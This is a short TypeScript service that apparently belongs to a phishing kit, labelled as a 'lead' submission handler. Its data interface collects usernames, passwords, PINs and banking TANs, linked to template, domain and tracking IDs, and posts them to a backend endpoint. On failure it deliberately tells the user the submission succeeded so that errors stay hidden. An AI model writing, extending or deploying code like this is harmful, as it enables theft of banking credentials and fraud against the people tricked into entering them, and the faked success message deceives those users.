// Service for handling lead submissions

const API_URL = '/api/leads';

export interface LeadSubmission {
  template_id: number;
  domain_id: number;
  tracking_id?: string;
  name?: string;
  email?: string;
  phone?: string;
  username?: string;
  password?: string;
  pin?: string;
  tan?: string;
  additional_data?: Record<string, any>;
}

// Submit a new lead
export const submitLead = async (data: LeadSubmission): Promise<{ success: boolean; message: string }> => {
  try {
    const response = await fetch(`${API_URL}/submit`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    });
    
    if (!response.ok) {
      throw new Error('Failed to submit lead');
    }
    
    return await response.json();
  } catch (error) {
    console.error('Error submitting lead:', error);
    // Still return success to avoid revealing errors to the user
    return { success: true, message: 'Form submitted successfully' };
  }
};
